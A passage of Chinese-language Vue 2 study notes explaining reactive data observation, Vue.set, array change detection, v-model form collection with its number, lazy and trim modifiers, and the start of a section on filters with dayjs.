能接收一个对象为参数，创建一个监视的实例对象</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Observer</span>(<span class="hljs-params">obj</span>) </span>&#123;<br>        <span class="hljs-comment">// 汇总对象中所有的属性，形成一个数组</span><br>        <span class="hljs-keyword">const</span> keys = <span class="hljs-built_in">Object</span>.keys(obj);<br>        <span class="hljs-comment">// 遍历</span><br>        keys.forEach((<span class="hljs-function">(<span class="hljs-params">k</span>)=&gt;</span>&#123;<br>            <span class="hljs-built_in">Object</span>.defineProperty(<span class="hljs-built_in">this</span>,k,&#123;<br>                <span class="hljs-function"><span class="hljs-title">get</span>(<span class="hljs-params"></span>)</span>&#123;<br>                    <span class="hljs-keyword">return</span> obj[k];<br>                &#125;,<br>                <span class="hljs-function"><span class="hljs-title">set</span>(<span class="hljs-params">val</span>)</span>&#123;<br>                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`<span class="hljs-subst">$&#123;k&#125;</span>被更改了，接下来将解析模板，生成虚拟DOM，……`</span>);<br>                    obj[k] = val;<br>                &#125;<br>            &#125;)<br>        &#125;))        <br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902224608449.png" srcset="/img/loading.gif" lazyload alt="image-20210902224608449" style="zoom:80%;" />

此处this是Observer的实例对象。

下面是代码效果：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902225104884.png" srcset="/img/loading.gif" lazyload alt="image-20210902225104884" style="zoom:80%;" />

当然，真正的Vue框架源代码复杂得多，功能也更加强大多元。

此处代码的缺憾：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902225457578.png" srcset="/img/loading.gif" lazyload alt="image-20210902225457578" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902225438442.png" srcset="/img/loading.gif" lazyload alt="image-20210902225438442" style="zoom:80%;" />

此处b没有了getter和setter，因为只考虑了处理了一层。

Vue中：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902225647131.png" srcset="/img/loading.gif" lazyload alt="image-20210902225647131" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902225718165.png" srcset="/img/loading.gif" lazyload alt="image-20210902225718165" style="zoom:80%;" />

哪怕是在数组中，也能找到对象。

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902230204746.png" srcset="/img/loading.gif" lazyload alt="image-20210902230204746" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902230502197.png" srcset="/img/loading.gif" lazyload alt="image-20210902230502197" style="zoom:80%;" />

Vue底层使用了递归了实现处理的逻辑，可以无限向内查找并处理，只要它是对象均能处理后添加getter和setter。

#### Vue.set()方法

需求：给student添加一个新的属性gender。

* 注意：

  <img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903090501245.png" srcset="/img/loading.gif" lazyload alt="image-20210903090501245" style="zoom:67%;" />

  这样并不会报错，虽然student.age不存在。

  * 读取一个对象中不存在的属性值时，返回的是underfined所以不会报错。而underfined值不会被展示到页面上。
  * a不存在，读取a--------报错
  * a存在，b不存在，读取b--------不报错

错误方法一

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903092148463.png" srcset="/img/loading.gif" lazyload alt="image-20210903092148463" style="zoom:80%;" />

错误方法二

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">vm.gender = <span class="hljs-string">&#x27;男&#x27;</span><br></code></pre></td></tr></table></figure>

原因：错得更加离谱，直接给vm添加属性gender，对数据代理机制不了解，因为gender属性会直接出现在vm实例上，本质上是因为vue先从data读取到gender，然后进行了数据代理，最后才会出现在vm实例上，直接添加属性值，相当于没有数据代理的步骤，不可能会出现getter和setter。

正解

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903093052198.png" srcset="/img/loading.gif" lazyload alt="image-20210903093052198" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903093827828.png" srcset="/img/loading.gif" lazyload alt="image-20210903093827828" style="zoom: 80%;" />

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>  Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>  const vm &#x3D; new Vue(&#123;<br>    el: &#39;#root&#39;,<br>    data: &#123;<br>      collage:&#39;UESTC&#39;,<br>      student: &#123;<br>        name: &#39;张加林&#39;,<br>        site: &#39;miketaylorjuly123.cn&#39;,<br>        age:20,<br>        friends: [<br>          &#123;name:&#39;jerry&#39;,age:20&#125;,<br>          &#123;name:&#39;mike&#39;,age:21&#125;,  <br>          &#123;name:&#39;tony&#39;,age:30&#125;<br>        ]<br>      &#125;<br>    &#125;,<br>    methods:&#123;<br>      addGender()&#123;<br>        &#x2F;&#x2F; Vue.set(this.student,&#39;gender&#39;,&#39;男&#39;);<br>        this.$set(this.student,&#39;gender&#39;,&#39;男&#39;);<br>      &#125;<br>    &#125;<br>  &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

实现：

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>  Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>  const vm &#x3D; new Vue(&#123;<br>    el: &#39;#root&#39;,<br>    data: &#123;<br>      collage:&#39;UESTC&#39;,<br>      student: &#123;<br>        name: &#39;张加林&#39;,<br>        site: &#39;miketaylorjuly123.cn&#39;,<br>        age:20,<br>        friends: [<br>          &#123;name:&#39;jerry&#39;,age:20&#125;,<br>          &#123;name:&#39;mike&#39;,age:21&#125;,  <br>          &#123;name:&#39;tony&#39;,age:30&#125;<br>        ]<br>      &#125;<br>    &#125;,<br>    methods:&#123;<br>      addGender()&#123;<br>        &#x2F;&#x2F; Vue.set(this.student,&#39;gender&#39;,&#39;男&#39;);<br>        this.$set(this.student,&#39;gender&#39;,&#39;男&#39;);<br>      &#125;<br>    &#125;<br>  &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/35.gif" srcset="/img/loading.gif" lazyload alt="35" style="zoom:80%;" />

##### 局限性

![image-20210903100546254](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903100546254.png)

说明Vue.set()只能给Vue中的某一个对象添加属性，而不能给data/Vue实例添加属性。

#### Vue监测数组数据原理

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903113657299.png" srcset="/img/loading.gif" lazyload alt="image-20210903113657299" style="zoom:67%;" />

没有为数组服务的getter和setter，所以当你按照数组索引修改hobby数组时，就会出现数据被更改，Vue未监测到的情况，下面是效果：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/36.gif" srcset="/img/loading.gif" lazyload alt="36" style="zoom:80%;" />

数组中每一个元素不是靠setter和getter来实现监视的。

Vue能监测到数组被修改的修改数组方法：

* push
* pop
* shift
* unshift
* splice：指定位置插入元素，或删除元素，或替换指定位置的某个元素
* sort：排序
* reverse：反转数组

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903114753915.png" srcset="/img/loading.gif" lazyload alt="image-20210903114753915" style="zoom:80%;" />

解决更新时问题：

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">this</span>.persons.splice(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,&#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;马老师&#x27;</span>,<span class="hljs-attr">gender</span>:<span class="hljs-string">&#x27;男&#x27;</span>&#125;)<br></code></pre></td></tr></table></figure>

Vue如何监测到调用了push/pop/shift/unshift：**包装技术**

Vue上调用的上述七个方法已经不是原来`Array.prototype`上的方法了。

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903115708584.png" srcset="/img/loading.gif" lazyload alt="image-20210903115708584" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903120147295.png" srcset="/img/loading.gif" lazyload alt="image-20210903120147295" style="zoom: 67%;" />

hobby数组被Vue管理，Vue中的push不再是正常原型上的push。

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903120358621.png" srcset="/img/loading.gif" lazyload alt="image-20210903120358621" style="zoom:80%;" />

注意：由于 JavaScript 的限制，Vue **不能检测**数组和对象的变化。

第二种能被Vue监测到的修改数组的方法：使用Vue.set()方法

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903120641801.png" srcset="/img/loading.gif" lazyload alt="image-20210903120641801" style="zoom:80%;" />

#### 总结

 <img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903164519252.png" srcset="/img/loading.gif" lazyload alt="image-20210903164519252" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;!--准备一个容器--&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;h2&gt;学生信息&lt;&#x2F;h2&gt;<br>    &lt;h3&gt;姓名：&#123;&#123;student.name&#125;&#125;&lt;&#x2F;h3&gt;<br>    &lt;h3&gt;年龄：&#123;&#123;student.age&#125;&#125;&lt;&#x2F;h3&gt;&lt;button @click&#x3D;&quot;student.age++&quot;&gt;年龄++&lt;&#x2F;button&gt;<br>    &lt;h2 v-if&#x3D;&quot;student.gender&quot;&gt;性别：&#123;&#123;student.gender&#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;button @click&#x3D;&quot;addGender&quot;&gt;添加性别，默认为男&lt;&#x2F;button&gt;<br>    &lt;button @click&#x3D;&quot;student.gender &#x3D; &#39;未知&#39;&quot;&gt;修改性别&lt;&#x2F;button&gt;<br>        &lt;h2&gt;爱好&lt;&#x2F;h2&gt;<br>    &lt;ul&gt;<br>      &lt;li v-for&#x3D;&quot;(h,index) in student.hobby&quot; :key&#x3D;&quot;index&quot;&gt;&#123;&#123;h&#125;&#125;&lt;&#x2F;li&gt;<br>    &lt;&#x2F;ul&gt;<br>    &lt;button @click&#x3D;&quot;addHobby&quot;&gt;添加爱好&lt;&#x2F;button&gt;<br>    &lt;button @click&#x3D;&quot;updateHobby&quot;&gt;更新爱好&lt;&#x2F;button&gt;<br>    &lt;button @click&#x3D;&quot;removeHobby&quot;&gt;过滤爱好&lt;&#x2F;button&gt;<br><br>    &lt;ul&gt;<br>      &lt;li v-for&#x3D;&quot;f,index in student.friends&quot; :key&#x3D;&quot;index&quot;&gt;&#123;&#123;f.name&#125;&#125;------&#123;&#123;f.age&#125;&#125;&lt;&#x2F;li&gt;<br>    &lt;&#x2F;ul&gt;<br>    &lt;button @click&#x3D;&quot;addFridens&quot;&gt;添加朋友&lt;&#x2F;button&gt;<br>    &lt;button @click&#x3D;&quot;updateFriends&quot;&gt;修改朋友&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>  Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>  const vm &#x3D; new Vue(&#123;<br>    el: &#39;#root&#39;,<br>    data: &#123;<br>      collage: &#39;UESTC&#39;,<br>      student: &#123;<br>        name: &#39;张加林&#39;,<br>        site: &#39;miketaylorjuly123.cn&#39;,<br>        age: 20,<br>        friends: [<br>          &#123; name: &#39;jerry&#39;, age: 20 &#125;,<br>          &#123; name: &#39;mike&#39;, age: 21 &#125;,<br>          &#123; name: &#39;tony&#39;, age: 30 &#125;<br>        ],<br>        hobby:[&#39;打游戏&#39;,&#39;看番&#39;,&#39;睡觉&#39;]<br>      &#125;<br>    &#125;,<br>    methods: &#123;<br>      addGender() &#123;<br>        &#x2F;&#x2F; Vue.set(this.student,&#39;gender&#39;,&#39;男&#39;);<br>        this.$set(this.student, &#39;gender&#39;, &#39;男&#39;);<br>      &#125;,<br>      addFridens()&#123;<br>          this.student.friends.push(&#123;name:&#39;wzith&#39;,age:12&#125;)<br>      &#125;,<br>      updateFriends()&#123;<br>          this.student.friends[0].name &#x3D; &#39;张三&#39;; &#x2F;&#x2F;注意：这是对象，有setter和getter<br>          this.student.friends[0].age &#x3D; 13;<br>      &#125;,<br>      addHobby()&#123;<br>          this.student.hobby.push(&#39;吃甜品&#39;)<br>      &#125;,<br>      updateHobby()&#123;<br>          this.student.hobby.splice(0,1,&#39;看美剧&#39;)<br>          &#x2F;&#x2F; Vue.set(this.student.hobby,0,&#39;看美剧&#39;);<br>      &#125;,<br>      removeHobby()&#123;<br>          this.student.hobby &#x3D; this.student.hobby.filter((h)&#x3D;&gt;&#123;<br>              return h !&#x3D;&#x3D; &#39;打游戏&#39;<br>          &#125;)<br>      &#125;<br>    &#125;<br>  &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

* Vue会监视data中所有层次的数据
* 如何监视对象中的数据？
  * 通过setter实现监视，且要在new Vue时就传入要检测的数据
    * 对象中后追加的属性，Vue默认不做响应式处理
    * 如需要给后添加的属性做响应式，请使用如下API：
      * `Vue.set(target,propertyName/index,value)` 或 `vm.$set(target,propertyName/index,value)`
* 如何监测数组中的数据？
  * 通过包裹数据更新元素的方法实现，本质就是对数组进行更新
  * 重新解析模板，进而更新页面
* 在Vue修改数组中的某个元素一定要使用如下方法：
  * 使用这些API：
    * `push()`
    * `pop()`
    * `shift()`
    * `unshift()`
    * `reverse()`
    * `sort()`
    * `splice()`
  * `Vue.set()`  或 `vm.$set()`
* 特别注意：`Vue.set()`和`vm.$set()不能给vm或vm的根数据对象添加数据

##### 数据劫持

![image-20210903165954197](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903165954197.png)

数据劫持和数据代理的原理都是Object.defineProperty()方法。

### 1.24 收集表单数据

##### 表单案例

v-model默认收集输入框的value值。

* 多选框

  <img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903192439735.png" srcset="/img/loading.gif" lazyload alt="image-20210903192439735" style="zoom:80%;" />

  <img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/37.gif" srcset="/img/loading.gif" lazyload alt="37" style="zoom:80%;" />

  不给标签配置value，那么默认收集的是标签的checked值（选中与否 ,true / false），而v-model是双向绑定，hobby变为true后，其他多选框的checked变为true。

  <img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903192706429.png" srcset="/img/loading.gif" lazyload alt="image-20210903192706429" style="zoom:80%;" />

  给多选框绑定value后，问题仍然无法解决。

  因为hobby的初始值可以影响着v-model收集回来的数据，换成数组即可(`hobby:[]`)

注意：点击提交后，会引起表单提交，默认会跳转页面，可以绑定一个点击事件，阻止默认行为(`prevent`)，或：<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903194121968.png" srcset="/img/loading.gif" lazyload alt="image-20210903194121968" style="zoom: 67%;" />

* 收集数据后的传输：

  * (不推荐)

    <img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903194938488.png" srcset="/img/loading.gif" lazyload alt="image-20210903194938488" style="zoom:80%;" />

    <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;account&quot;</span>:<span class="hljs-string">&quot;111&quot;</span>,<span class="hljs-attr">&quot;password&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-attr">&quot;gender&quot;</span>:<span class="hljs-string">&quot;female&quot;</span>,<span class="hljs-attr">&quot;hobby&quot;</span>:[<span class="hljs-string">&quot;game&quot;</span>],<span class="hljs-attr">&quot;city&quot;</span>:<span class="hljs-string">&quot;ShenZhen&quot;</span>,<span class="hljs-attr">&quot;other&quot;</span>:<span class="hljs-string">&quot;111&quot;</span>,<span class="hljs-attr">&quot;agree&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>

  * 推荐：

    <img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903195152267.png" srcset="/img/loading.gif" lazyload alt="image-20210903195152267" style="zoom:80%;" />

##### 完整代码

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;form @submit.prevent&#x3D;&quot;demo&quot;&gt;<br>            &lt;h2&gt;输入框&lt;&#x2F;h2&gt; <br>            &lt;label for&#x3D;&quot;account&quot;&gt;账号：&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;account&quot; v-model&#x3D;&quot;userInfo.account&quot;&gt;&lt;&#x2F;label&gt;&lt;br &#x2F;&gt;<br>            &lt;label for&#x3D;&quot;password&quot;&gt;密码：&lt;input type&#x3D;&quot;password&quot; id&#x3D;&quot;password&quot; v-model&#x3D;&quot;userInfo.password&quot;&gt;&lt;&#x2F;label&gt;&lt;br &#x2F;&gt;<br>            年龄：&lt;input type&#x3D;&quot;text&quot; v-model.number&#x3D;&quot;userInfo.age&quot;&gt;<br>            &lt;h2&gt;单选框&lt;&#x2F;h2&gt;<br>            性别：<br>            &lt;!-- radio要求亲自配置value --&gt;<br>            男&lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;gender&quot; v-model&#x3D;&quot;userInfo.gender&quot; value&#x3D;&quot;male&quot;&gt;<br>            女&lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;gender&quot; v-model&#x3D;&quot;userInfo.gender&quot; value&#x3D;&quot;female&quot;&gt;&lt;br &#x2F;&gt;<br>            &lt;h2&gt;多选框&lt;&#x2F;h2&gt;<br>            爱好：<br>            学习&lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;userInfo.hobby&quot; value&#x3D;&quot;study&quot;&gt;<br>            打游戏&lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;userInfo.hobby&quot; value&#x3D;&quot;game&quot;&gt;<br>            吃甜品&lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;userInfo.hobby&quot; value&#x3D;&quot;sweet&quot;&gt; &lt;br &#x2F;&gt;<br>            &lt;h2&gt;下拉框&lt;&#x2F;h2&gt;<br>            所属校区：<br>            &lt;select v-model&#x3D;&quot;userInfo.city&quot;&gt;<br>                &lt;option value&#x3D;&quot;&quot;&gt;请选择校区&lt;&#x2F;option&gt;<br>                &lt;option value&#x3D;&quot;BeiJing&quot;&gt;北京&lt;&#x2F;option&gt;<br>                &lt;option value&#x3D;&quot;ShangHai&quot;&gt;上海&lt;&#x2F;option&gt;<br>                &lt;option value&#x3D;&quot;ShenZhen&quot;&gt;深圳&lt;&#x2F;option&gt;<br>                &lt;option value&#x3D;&quot;GuangZhou&quot;&gt;广州&lt;&#x2F;option&gt;<br>                &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;<br>            &lt;&#x2F;select&gt;<br>            &lt;h2&gt;其他信息&lt;&#x2F;h2&gt;<br>            &lt;textarea v-model.lazy&#x3D;&quot;userInfo.other&quot;&gt;&lt;&#x2F;textarea&gt;<br>            &lt;br &#x2F;&gt;<br>            &lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;userInfo.agree&quot;&gt;<br>            阅读并接受&lt;a href&#x3D;&quot;miketaylorjuly123.cn&quot;&gt;《用户协议》&lt;&#x2F;a&gt;<br>            &lt;br &#x2F;&gt;<br>            &lt;button&gt;提交&lt;&#x2F;button&gt;<br><br>        &lt;&#x2F;form&gt;<br>    &lt;&#x2F;div&gt;<br><br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            userInfo: &#123;<br>                account: &#39;&#39;,<br>                password: &#39;&#39;,<br>                gender: &#39;female&#39;, &#x2F;&#x2F; 默认选female<br>                hobby: [],<br>                city: &#39;BeiJing&#39;,<br>                other: &#39;&#39;,<br>                agree: &#39;&#39;,<br>                age: &#39;&#39;<br>            &#125;<br>        &#125;,<br>        methods: &#123;<br>            demo() &#123;<br>            	console.log(this.userInfo)<br>                &#x2F;&#x2F; console.log(JSON.stringify(this._data))<br>            &#125;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

##### v-model的修饰符

###### number

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903195606755.png" srcset="/img/loading.gif" lazyload alt="image-20210903195606755" style="zoom:80%;" />

优化：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903195714716.png" srcset="/img/loading.gif" lazyload alt="image-20210903195714716" style="zoom:80%;" />

type限定只接受数字输入，其他类型输入会被屏蔽，但是收集的数据仍然是字符串格式，而v-model的修饰符，强制将收集的数据类型转换为数值型。

只使用v-model的修饰符只能起到部分作用，当首字符是数字，收集连续的数字为数值型数据，当出现非数字后，屏蔽后续输入；当首字符不是数字，收集所有输入为字符串。

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/38.gif" srcset="/img/loading.gif" lazyload alt="38" style="zoom:80%;" />

###### lazy

用于不希望敏感实时收集数据的情况，比如防抖，当表单节点失去焦点时，才会收集数据。

###### trim

去掉首尾空格，和Js中的trim()效果一样

##### 总结

* 收集表单数据：
  * 若：`<input type="text">`，则v-model收集的是value的值，用户输入即为value值
  * 若：`<input type="radio">`，则v-model收集的是value的值，且要给标签配置value值
  * 若：`<input type="checkbox">`
    * 没有配置input的value属性：
      * v-model的初始值是非数组，那么收集的就是checked（勾选或未勾选，是boolean值）
      * 配置了input的value属性：
        * v-model的初始值是数组，那么收集的就是checked（勾选或未勾选，是boolean值）
        * v-model的初始值是数组，那么收集的就是value组成的数组
  * 备注：v-model的三个修饰符：
    * lazy：失去焦点后再收集数据
    * trim：输入首尾空格过滤
    * number：输入字符转为有效的数字

### 1.25 过滤器

*非必须工具*

需求：显示格式化时间

#### day.js

[BootCDN](https://www.bootcdn.cn/)：第三方库大全

![image-20210903202719446](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903202719446.png)

![image-20210903202750253](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903202750253.png)

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903203134543.png" srcset="/img/loading.gif" lazyload alt="image-20210903203134543" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903203154172.png" srcset="/img/loading.gif" lazyload alt="image-20210903203154172" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;!--准备一个容器--&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;h2&gt;显示格式化后的时间&lt;&#x2F;h2&gt;<br>    &lt;h3&gt;现在是：&#123;&#123;fmtTime&#125;&#125;&lt;&#x2F;h3&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>  Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>  new Vue(&#123;<br>    el: &#39;#root&#39;,<br>    data: &#123;<br>      time: 1630671767228, &#x2F;&#x2F;时间戳<br>    &#125;,<br>    computed: &#123;<br>      fmtTime() &#123;<br>        return dayjs(this.time).format(&#39;YYYY-MM-DD HH:mm:ss&#39;); &#x2F;&#x2F;给参数格式化参数时间，不给参数默认格式化当前时间<br>      &#125;<br>    &#125;<br>  &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

#### 案例实现

`|`：管道符

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903204338824.png" srcset="/img/loading.gif" lazyload alt="image-20210903204338824" style="zoom:80%;" />

即使timeFormater不加`()`，过滤器也会把time作为参数，传递给timeFormater，而timeFormater的返回值会替换time成为实际值。

